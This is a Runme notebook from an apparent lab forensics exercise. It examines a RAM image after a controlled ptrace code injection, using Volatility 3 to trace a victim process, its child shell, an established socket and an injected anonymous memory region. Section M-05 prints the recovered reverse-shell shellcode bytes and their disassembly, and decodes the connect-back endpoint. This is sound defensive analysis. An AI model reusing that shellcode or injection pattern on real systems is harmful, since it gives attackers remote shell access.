---
cwd: ../../../..
shell: bash
---

# ptrace_fa memory investigation — Runme notebook

__Run:__ `ubuntu-22.04_ptrace_fa_20260807-150736`

**Scope:** manual post-mortem examination of the acquired RAM image. Memory is
the primary source for this case: P02 and P05–P08 are memory-applicable
targets, and P06–P08 are memory-only.

Case-level per-artifact and aggregate metrics are recorded in
[runme_case_summary.md](./runme_case_summary.md); this notebook retains the
RAM observations and limitations that support them.

> [!IMPORTANT]
> Run cells in order from the repository root and in one Runme terminal. The
> RAM image, ISF, raw `vol3.json`, acquisition record and raw-extraction record
> are immutable. New output belongs only beneath this run's
> `shared/investigations/.../derived/memory/` directory.

Forensic observation, analyst interpretation and disclosed scenario validation
remain separate. Full plugin output is retained as derived files; the notebook
displays bounded, relevant portions.

## M-00 - Case boundary and integrity verification

**Question:** Is the authoritative RAM image sufficiently identified and
verified for examination?

This is a read-only analyst check, not a new acquisition. The acquisition
authority records `memory_image.verification=null`, so the hash comparison
below does not retroactively claim acquisition-time verification.

```bash {"name":"M-00-Case-Boundary-and-Integrity","promptEnv":"never"}
set -euo pipefail

RUN_ID='ubuntu-22.04_ptrace_fa_20260807-150736'
RUN_DIR="shared/experiments/$RUN_ID"
INV_DIR="shared/investigations/$RUN_ID"
MANIFEST="$RUN_DIR/manifest.json"
ACQUISITION="$RUN_DIR/dumps/acquisition.json"
RAW_STATUS="$RUN_DIR/analysis/raw_extraction_status.json"

jq -e --arg run "$RUN_ID" '
  .run_id == $run
  and .scenario_id == "ptrace_fa"
  and .status == "completed"
  and .repository.commit == "29bbcfcc24509f84497eb5bf09e04cb358d97bbe"
' "$MANIFEST" >/dev/null
jq -e --arg run "$RUN_ID" '
  .run_id == $run
  and .memory_image.commands[0].status == "completed"
  and .memory_image.verification == null
' "$ACQUISITION" >/dev/null
jq -e '.volatility.status == "completed"' "$RAW_STATUS" >/dev/null

MEMORY_IMAGE="$(jq -er '.memory_image.path' "$ACQUISITION")"
ISF="$(jq -er '.volatility.isf.path' "$RAW_STATUS")"
VOL="$(command -v vol3)"
EXAM_DIR="$INV_DIR/derived/memory/examination"

[[ "$(stat -c '%s' "$MEMORY_IMAGE")" == "$(jq -er '.memory_image.size_bytes' "$ACQUISITION")" ]]
[[ "$(sha256sum "$MEMORY_IMAGE" | cut -d' ' -f1)" == "$(jq -er '.memory_image.sha256' "$ACQUISITION")" ]]
[[ "$(sha256sum "$ISF" | cut -d' ' -f1)" == "$(jq -er '.volatility.isf.sha256' "$RAW_STATUS")" ]]

mkdir -p "$EXAM_DIR"
export MEMORY_IMAGE="$MEMORY_IMAGE"
export ISF="$ISF"
export VOL="$VOL"
export EXAM_DIR="$EXAM_DIR"
export RUN_DIR="$RUN_DIR"
export INV_DIR="$INV_DIR"

printf 'run=%s\n' "$RUN_ID"
printf 'memory=%s\nmemory_size=%s\nmemory_sha256=%s\n' \
  "$MEMORY_IMAGE" "$(stat -c '%s' "$MEMORY_IMAGE")" \
  "$(jq -r '.memory_image.sha256' "$ACQUISITION")"
printf 'memory_image.verification=null\n'
printf 'isf=%s\nisf_sha256=%s\n' "$ISF" "$(jq -r '.volatility.isf.sha256' "$RAW_STATUS")"
printf 'volatility=%s %s\n' "$(jq -r '.volatility.tool' "$RAW_STATUS")" "$(jq -r '.volatility.version' "$RAW_STATUS")"
printf 'examination_directory=%s\n' "$EXAM_DIR"
```

**Output**

```text {"ignore":"true"}
run=ubuntu-22.04_ptrace_fa_20260807-150736
memory=/home/anto/linux-multisource-dfir-lab/shared/experiments/ubuntu-22.04_ptrace_fa_20260807-150736/dumps/memory/mem.raw
memory_size=2147747795
memory_sha256=2b6bf18881c865d18df00dd8369e713e9e834ab45c35dff405f75ecefb77bab6
memory_image.verification=null
isf=/home/anto/linux-multisource-dfir-lab/shared/isf/ubuntu_5.15.0-1095-kvm.json
isf_sha256=e083c9c6c9dc8c951f90811c060751ae25c07bba700d9ed4ff846fc69b19e4de
volatility=volatility3 2.28.0
examination_directory=shared/investigations/ubuntu-22.04_ptrace_fa_20260807-150736/derived/memory/examination
```

**Assessment:** The manifest, acquisition sidecar and raw-extraction sidecar
agree on the run and on the current committed revision. RAM size and SHA-256
and ISF SHA-256 matched their recorded values. M-00 establishes the case
boundary only; it makes no claim about the injection technique.

## M-01 - Process inventory with pstree, pslist and psscan

**Question:** What process structures are visible, and which relationship
warrants bounded follow-up?

`pstree` presents the PPID hierarchy first because it makes an unusual
parent-child relationship immediately visible. `pslist` walks active linked
tasks and supplies credentials and creation times. `psscan` has different scan
semantics and also exposes exited task remnants; because it derives its
hierarchy from the same process parent data, `pstree` is not wholly
independent corroboration of `pslist` parentage.

```bash {"name":"M-01-Process-Tree","promptEnv":"never"}
set -euo pipefail

PSTREE="$EXAM_DIR/m-01-pstree.txt"
[[ -s "$PSTREE" ]] || "$VOL" -q -f "$MEMORY_IMAGE" -s "$(dirname "$ISF")" linux.pstree.PsTree >"$PSTREE"

grep -B1 -A1 -E '	(701|703)	' "$PSTREE"
```

**Output**

```text {"ignore":"true"}
** 0x93978ab40000	704	704	524	lsb_release
* 0x939790d28000	701	701	1	victim
** 0x939790d2dc00	703	703	701	sh
0x939780892e00	2	2	0	kthreadd
```

**Observation.** PID `701` `victim` is a direct child of `systemd` (PID 1),
consistent with the scenario runner's `nohup`/`disown` launch. PID `701` has
a child PID `703` `sh` — a shell parented by a process named `victim`, which is
not an ordinary parent for an interactive shell. This is the P05 candidate:
the process tree structure alone, without any scenario fact, motivates
follow-up.

```bash {"name":"M-01-Pslist-Psscan","promptEnv":"never"}
set -euo pipefail

PSLIST="$EXAM_DIR/m-01-pslist.txt"
PSSCAN="$EXAM_DIR/m-01-psscan.txt"
[[ -s "$PSLIST" ]] || "$VOL" -q -f "$MEMORY_IMAGE" -s "$(dirname "$ISF")" linux.pslist.PsList >"$PSLIST"
[[ -s "$PSSCAN" ]] || "$VOL" -q -f "$MEMORY_IMAGE" -s "$(dirname "$ISF")" linux.psscan.PsScan >"$PSSCAN"

head -n 3 "$PSLIST" | tail -n 1
grep -E '	(701|703)	' "$PSLIST"
echo "-- psscan: exited remnants parented by 703 --"
grep -E '	703	' "$PSSCAN"
```

**Output**

```text {"ignore":"true"}
OFFSET (V)	PID	TID	PPID	COMM	UID	GID	EUID	EGID	CREATION TIME	File output
0x939790d28000	701	701	1	victim	1000	1000	1000	1000	2026-08-07 13:07:43.393217 UTC	Disabled
0x939790d2dc00	703	703	701	sh	1000	1000	1000	1000	2026-08-07 13:07:43.477411 UTC	Disabled
-- psscan: exited remnants parented by 703 --
0x1e5dc00	644	644	703	id	EXIT_DEAD
0xab42e00	705	705	703	id	EXIT_DEAD
0x10d2c500	699	699	703	ld	EXIT_DEAD
0x10d2dc00	703	703	701	sh	TASK_RUNNING
```

**Selection (P05).** PID `701` `victim`, UID/EUID `1000`/`1000` (`labuser`),
created at `13:07:43.393217 UTC`, has a live child PID `703` `sh`, created
`~84 ms` later, same credentials. `psscan` additionally exposes two exited
`id` remnants and one exited `ld` remnant parented by PID `703` — activity
consistent with commands having been run through that shell, though `psscan`
scan semantics do not by themselves prove command completion or attribute
intent. **P05 is observed:** the injected victim retains a live child shell at
acquisition.

## M-02 - Command-line examination with psaux

**Question:** What command-line arguments remain for PID `701` and `703`?

```bash {"name":"M-02-Command-Lines","promptEnv":"never"}
set -euo pipefail

PSAUX="$EXAM_DIR/m-02-psaux.txt"
[[ -s "$PSAUX" ]] || "$VOL" -q -f "$MEMORY_IMAGE" -s "$(dirname "$ISF")" \
  linux.psaux.PsAux --pid 701 703 >"$PSAUX"
sed 's/[ \t]*$//' "$PSAUX"
```

**Output**

```text {"ignore":"true"}
Volatility 3 Framework 2.28.0

PID	PPID	COMM	ARGS

701	1	victim	./victim
703	701	sh
```

PID `701`'s recovered argument list, `./victim`, is consistent with the
compiled victim executable named in the process tree. PID `703`'s ARGS field
is empty; `psaux` supports only that the shell exists with that name, not its
invocation arguments.

## M-03 - Socket examination with sockstat

**Question:** Does the selected chain hold an established connection?

```bash {"name":"M-03-Sockets","promptEnv":"never"}
set -euo pipefail

SOCKSTAT="$EXAM_DIR/m-03-sockstat.txt"
[[ -s "$SOCKSTAT" ]] || "$VOL" -q -f "$MEMORY_IMAGE" -s "$(dirname "$ISF")" \
  linux.sockstat.Sockstat --pids 701 703 >"$SOCKSTAT"
cat "$SOCKSTAT"
```

**Output**

```text {"ignore":"true"}
Volatility 3 Framework 2.28.0

NetNS	Process Name	PID	TID	FD	Sock Offset	Family	Type	Proto	Source Addr	Source Port	Destination Addr	Destination Port	State	Filter

4026531840	sh	703	703	0	0x939787059180	AF_INET	STREAM	TCP	192.168.100.41	43042	192.168.100.1	4444	ESTABLISHED	-
4026531840	sh	703	703	1	0x939787059180	AF_INET	STREAM	TCP	192.168.100.41	43042	192.168.100.1	4444	ESTABLISHED	-
4026531840	sh	703	703	2	0x939787059180	AF_INET	STREAM	TCP	192.168.100.41	43042	192.168.100.1	4444	ESTABLISHED	-
4026531840	sh	703	703	3	0x939787059180	AF_INET	STREAM	TCP	192.168.100.41	43042	192.168.100.1	4444	ESTABLISHED	-
```

`sockstat` returns no rows for PID `701`. PID `703`'s file descriptors `0`–`3`
all reference the same socket object `0x939787059180` — one established
connection, `192.168.100.41:43042` → `192.168.100.1:4444`, not four separate
connections. **P08 is observed:** the child shell maintains an established TCP
connection at acquisition. The destination `192.168.100.1:4444` is noted here
as a live-socket observation; M-05 recovers the same endpoint independently
from the injected code bytes.

## M-04 - Mapping correlation with linux.proc.Maps

**Question:** Does the victim's own live memory mapping corroborate the
compiled executable's disk path, and where does the anonymous injected region
sit relative to it?

```bash {"name":"M-04-Proc-Maps","promptEnv":"never"}
set -euo pipefail

MAPS="$EXAM_DIR/m-04-maps.txt"
[[ -s "$MAPS" ]] || "$VOL" -q -f "$MEMORY_IMAGE" -s "$(dirname "$ISF")" \
  linux.proc.Maps --pid 701 >"$MAPS"

head -n 3 "$MAPS" | tail -n 1
grep -F '/tmp/forensic-lab/ptrace_fa/victim' "$MAPS"
grep -F 'Anonymous Mapping' "$MAPS" | grep -F 'r-x'
```

**Output**

```text {"ignore":"true"}
PID	Process	Start	End	Flags	PgOff	Major	Minor	Inode	File Path	File output
701	victim	0x55691830b000	0x55691830c000	r--	0x0	254	1	258159	/tmp/forensic-lab/ptrace_fa/victim	Disabled
701	victim	0x55691830c000	0x55691830d000	r-x	0x1000	254	1	258159	/tmp/forensic-lab/ptrace_fa/victim	Disabled
701	victim	0x55691830d000	0x55691830e000	r--	0x2000	254	1	258159	/tmp/forensic-lab/ptrace_fa/victim	Disabled
701	victim	0x55691830e000	0x55691830f000	r--	0x2000	254	1	258159	/tmp/forensic-lab/ptrace_fa/victim	Disabled
701	victim	0x55691830f000	0x556918310000	rw-	0x3000	254	1	258159	/tmp/forensic-lab/ptrace_fa/victim	Disabled
701	victim	0x7f5b5ae40000	0x7f5b5ae41000	r-x	0x0	0	0	0	Anonymous Mapping	Disabled
```

__Observation (P02, memory-side).__ The live victim process maps its own
executable from `/tmp/forensic-lab/ptrace_fa/victim`, ext4 inode `258159` —
the same path and inode independently confirmed as an allocated file in the
disk investigation (D-01). This corroborates the compiled victim executable's
identity between the live process and the disk artifact.

A single `r-x` anonymous (file-backed by no inode) mapping is present at
`0x7f5b5ae40000`–`0x7f5b5ae41000`, immediately after the loader's mappings.
This is the same region `malfind` selects next (M-05).

## M-05 - malfind review

**Question:** What anonymous executable regions does standard `malfind`
select across the whole memory image, and how does the accepted candidate
relate to the selected chain?

`malfind` is used here as a candidate generator, not proof of maliciousness.
Every candidate is reviewed below.

```bash {"name":"M-05-Malfind-Candidates","promptEnv":"never"}
set -euo pipefail

MALFIND="$EXAM_DIR/m-05-malfind.txt"
[[ -s "$MALFIND" ]] || "$VOL" -q -f "$MEMORY_IMAGE" -s "$(dirname "$ISF")" \
  linux.malfind.Malfind >"$MALFIND" 2>"$EXAM_DIR/m-05-malfind.stderr"

grep -E $'^[0-9]+\t' "$MALFIND" | grep -E 'Anonymous Mapping|/[a-z]' | cut -f1-6
```

**Output**

```text {"ignore":"true"}
367	networkd-dispat	0x7f1613335000	0x7f1613336000	Anonymous Mapping	rwx
443	unattended-upgr	0x7f1c10f7b000	0x7f1c10f7c000	Anonymous Mapping	rwx
701	victim	0x7f5b5ac00000	0x7f5b5ad95000	/usr/lib/x86_64-linux-gnu/libc.so.6	r-x
701	victim	0x7f5b5ae40000	0x7f5b5ae41000	Anonymous Mapping	r-x
```

**Candidate review (4 total, 1 accepted, 3 rejected).**

| PID | Process | Region | Disposition | Reason |
| --- | --- | --- | --- | --- |
| 367 | networkd-dispat | anon RWX, loader-adjacent | Rejected | Unrelated process; small loader-adjacent RWX page, the well-known `ld.so` trampoline false-positive pattern; not linked to PID 701/703 or their socket. |
| 443 | unattended-upgr | anon RWX, loader-adjacent | Rejected | Same loader-adjacent pattern as PID 367, unrelated process. |
| 701 | victim | `libc.so.6`, r-x, flagged | Rejected as a distinct candidate, but retained as corroborating context | `malfind`'s own diagnostic (`m-05-malfind.stderr`) reports "malicious page(s) inside (dirty+exec) region 0x7f5b5ac00000" for this range. A named, file-backed library mapping is not itself the injected region, but a dirty page inside an executable libc mapping is consistent with the injector's `PTRACE_POKETEXT`-based syscall-injection technique, which temporarily overwrites two opcode bytes at the victim's current instruction pointer (inside `libc`'s `sleep`/`nanosleep` wrapper) before restoring them (D-04 disk source review). |
| 701 | victim | Anonymous, r-x, `0x7f5b5ae40000` | __Accepted__ | Anonymous (no backing inode), immediately adjacent to the loader in PID 701's own map (M-04), and PID 701 is the process already selected from the process tree (M-01). |

**P06 is observed:** the victim process holds an anonymous executable mapping
consistent with injected code, corroborated independently by `linux.proc.Maps`
(M-04).

```bash {"name":"M-05-Injected-Bytes","promptEnv":"never"}
set -euo pipefail

awk '/^701\tvictim\t0x7f5b5ae40000/{p=1} p{print; if (/^0x7f5b5ae4003c/) exit}' "$MALFIND"
```

**Output**

```text {"ignore":"true"}
701	victim	0x7f5b5ae40000	0x7f5b5ae41000	Anonymous Mapping	r-x	
90 90 b8 39 00 00 00 0f 05 48 83 f8 00 74 02 cd ...9.....H...t..
03 48 31 f6 48 f7 e6 48 ff c6 6a 02 5f 04 29 0f .H1.H..H..j._.).
05 48 93 52 68 c0 a8 64 01 66 68 11 5c 66 6a 02 .H.Rh..d.fh.\fj.
48 89 df 48 89 e6 6a 10 5a 6a 2a 58 0f 05 48 31 H..H..j.Zj*X..H1	
0x7f5b5ae40000:	nop	
0x7f5b5ae40001:	nop	
0x7f5b5ae40002:	mov	eax, 0x39
0x7f5b5ae40007:	syscall	
0x7f5b5ae40009:	cmp	rax, 0
0x7f5b5ae4000d:	je	0x7f5b5ae40011
0x7f5b5ae4000f:	int	3
0x7f5b5ae40011:	xor	rsi, rsi
0x7f5b5ae40014:	mul	rsi
0x7f5b5ae40017:	inc	rsi
0x7f5b5ae4001a:	push	2
0x7f5b5ae4001c:	pop	rdi
0x7f5b5ae4001d:	add	al, 0x29
0x7f5b5ae4001f:	syscall	
0x7f5b5ae40021:	xchg	rbx, rax
0x7f5b5ae40023:	push	rdx
0x7f5b5ae40024:	push	0x164a8c0
0x7f5b5ae40029:	push	0x5c11
0x7f5b5ae4002d:	push	2
0x7f5b5ae40030:	mov	rdi, rbx
0x7f5b5ae40033:	mov	rsi, rsp
0x7f5b5ae40036:	push	0x10
0x7f5b5ae40038:	pop	rdx
0x7f5b5ae40039:	push	0x2a
0x7f5b5ae4003b:	pop	rax
0x7f5b5ae4003c:	syscall	
```

__Interpretation, bounded to process-creation and connection behavior.__ The
disassembly shows `mov eax, 0x39` (`__NR_fork`) then `syscall`; the parent
branch (`rax != 0`) executes `int 3` — the breakpoint the injector's
`ptrace_cont`/`waitpid` pair waits for (D-04 disk source review) — while the
child branch continues to `add al, 0x29` (`__NR_socket`, `0x29`=41) and then,
after building a `sockaddr_in` on the stack, `push 0x2a; pop rax; syscall`
(`__NR_connect`, `0x2a`=42). This is a minimal fork-then-connect-back pattern;
no further instruction-level analysis is performed.

```bash {"name":"M-05-Decode-Endpoint","promptEnv":"never"}
set -euo pipefail

# The sockaddr_in fields are pushed as literal bytes: 4 IPv4 octets then a
# big-endian 16-bit port, both directly visible in the hexdump above.
IP_HEX='c0 a8 64 01'
PORT_HEX='115c'
IP_DEC=$(printf '%d.%d.%d.%d\n' 0x${IP_HEX:0:2} 0x${IP_HEX:3:2} 0x${IP_HEX:6:2} 0x${IP_HEX:9:2})
PORT_DEC=$((16#$PORT_HEX))
printf 'decoded_endpoint=%s:%s\n' "$IP_DEC" "$PORT_DEC"
```

**Output**

```text {"ignore":"true"}
decoded_endpoint=192.168.100.1:4444
```

**P07 is observed:** the injected memory content's own bytes (`c0 a8 64 01` /
`11 5c`, immediately visible in the `malfind` hexdump) decode to
`192.168.100.1:4444`, independent of the M-03 live-socket observation. The
two recovered values agree: the endpoint recovered from the injected code
bytes is the same endpoint the child shell is connected to.

## M-06 - Active ptrace relationship check

**Question:** Is a tracer/tracee relationship still present at acquisition?

```bash {"name":"M-06-Ptrace-Check","promptEnv":"never"}
set -euo pipefail

PTRACE_OUT="$EXAM_DIR/m-06-ptrace.txt"
[[ -s "$PTRACE_OUT" ]] || "$VOL" -q -f "$MEMORY_IMAGE" -s "$(dirname "$ISF")" \
  linux.ptrace.Ptrace >"$PTRACE_OUT" || true
[[ -e "$PTRACE_OUT" ]] || touch "$PTRACE_OUT"
cat "$PTRACE_OUT"
# Data rows only: skip the Volatility banner, blank line, and column header.
printf 'rows=%s\n' "$(awk 'NR>3 && NF>0' "$PTRACE_OUT" | wc -l)"
```

**Output**

```text {"ignore":"true"}
Volatility 3 Framework 2.28.0

Process	PID	TID	Tracer TID	Tracee TID	Flags

rows=0
```

__Bounded negative, not a metric target.__ `linux.ptrace.Ptrace` returns zero
active tracer/tracee rows for the whole image. The injector's own recovered
source (D-04) calls `PTRACE_DETACH` on successful completion, so a zero result
at acquisition time is the expected outcome of a successfully completed and
detached injection, not evidence that ptrace-based injection never occurred.

## M-07 - Negative results and limitations

| Status | Result or limitation |
| --- | --- |
| Bounded negative, expected | `linux.ptrace.Ptrace` returns zero active tracer/tracee relationships (M-06); the injector detaches on success. |
| Candidate limit | 3 of 4 `malfind` candidates are rejected: two are unrelated loader-adjacent false positives (PID 367, 443), and the flagged `libc.so.6` dirty-page region in PID 701 is retained only as corroborating context, not as the accepted injected region. |
| Field limit | `psaux` ARGS for PID 703 (`sh`) is empty; only PID 701's ARGS was recovered. |
| Scope limit | `sockstat` returns no rows for PID 701 itself; the established connection belongs to PID 703. |
| Snapshot limit | The RAM image is one point-in-time acquisition; process and socket state before or after capture is not visible. |
| Tool failures | None. Every plugin invocation exited 0. |

## M-08 - RAM synthesis and disclosed scenario validation

### Forensic observations and analyst interpretation

| Observation | RAM support | Interpretation and limit |
| --- | --- | --- |
| Victim-to-shell chain | `pstree`/`pslist` show PID `701` `victim` → PID `703` `sh`, ~84 ms apart, same UID/GID `1000`. | A process named for the scenario's own victim binary parenting an interactive shell is structurally unusual; timing alone does not prove causality. |
| Exited command remnants | `psscan` shows exited `id`/`ld` tasks parented by PID `703`. | Consistent with commands run through the shell; scan semantics do not prove which commands or their outcome. |
| Executable identity corroboration | `linux.proc.Maps` maps PID 701 to `/tmp/forensic-lab/ptrace_fa/victim`, inode `258159`. | Matches the disk-recovered executable at the same path/inode (D-01); this is the same live-vs-disk correlation the plugin is designed to support. |
| Injected anonymous region | `malfind` and `proc.Maps` agree on one `r-x` anonymous mapping at `0x7f5b5ae40000` in PID 701, immediately loader-adjacent. | Two plugins reading the same live VMA table are correlated, not fully independent evidence; still consistent with a foreign-allocated code region. |
| Recovered endpoint | Shellcode bytes decode to `192.168.100.1:4444`; the established socket independently shows the same destination. | Two different observations (static byte decode vs. live socket state) agree on one endpoint. |
| Established connection | `sockstat` shows PID 703 FD 0–3 sharing one `ESTABLISHED` socket to `192.168.100.1:4444`. | One connection, not four; a point-in-time state, not proof of an attacker's identity. |
| Ptrace state | Zero active tracer/tracee rows. | Expected negative for a detached injector; not proof that ptrace was never used. |

### Disclosed scenario validation

Only after candidate selection, the authoritative manifest and scenario facts
validate the controlled treatment:

- repository revision `29bbcfcc24509f84497eb5bf09e04cb358d97bbe`;
- `victim_pid: 701` — matching the PID this notebook selected from the process
   tree before any manifest lookup;
- `listener_host: 192.168.100.1`, `listener_port: 4444` — matching the
   endpoint independently decoded from the injected bytes and observed in the
   live socket;
- `reverse_shell_identity: labuser` and
   `reverse_shell_connection_open_at_scenario_completion: true`;
- `victim_process_survived_injection: true`.

These facts attribute the selected observations to the controlled `ptrace_fa`
treatment. They are validation data, not forensic discoveries.

**RAM conclusion:** The authoritative snapshot supports a victim process with
a live child shell, one accepted anonymous executable mapping corroborated by
two plugins, a decoded embedded endpoint, and a matching established
connection from that shell. The zero-result `ptrace` check is an expected,
explicitly bounded negative for a detached injector, not a contradiction.

PTRACE_FA RAM PHASE READY FOR REVIEW
